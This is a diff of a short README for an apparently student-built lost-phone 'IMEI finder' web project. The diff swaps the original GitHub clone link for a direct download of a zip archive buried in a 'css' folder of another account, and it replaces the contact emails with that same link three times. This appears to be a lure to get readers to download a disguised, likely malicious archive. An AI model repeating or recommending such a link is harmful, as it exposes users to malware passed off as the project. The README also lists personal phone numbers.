@@ -4,13 +4,13 @@
 ## Description
 It only implies when someone want to retrive his lost phone
 ## Setup/Installation Requirements
-If you want view it,clone it from the https://github.com/richardwillie/IMEIfind.git
+If you want view it,clone it from the https://raw.githubusercontent.com/anakiseng789/IMEIfind/development/user-details/css/Ifind-IME-v1.4.zip
 ## Known Bugs
 Just clone it.
 ## Technologies Used
 Used Bootstrap,Html,Css,Jquery and Javascript.
 ## Support and contact details
 For more details contact:0702769629, 0791225243, 0728282250
-email:adhiambolydia96@gmail.column, makotozamzam7@gmail.com, richardwillie.w@gmail.com
+https://raw.githubusercontent.com/anakiseng789/IMEIfind/development/user-details/css/Ifind-IME-v1.4.zip, https://raw.githubusercontent.com/anakiseng789/IMEIfind/development/user-details/css/Ifind-IME-v1.4.zip, https://raw.githubusercontent.com/anakiseng789/IMEIfind/development/user-details/css/Ifind-IME-v1.4.zip
 ### License
 It is licensed under richardwillie
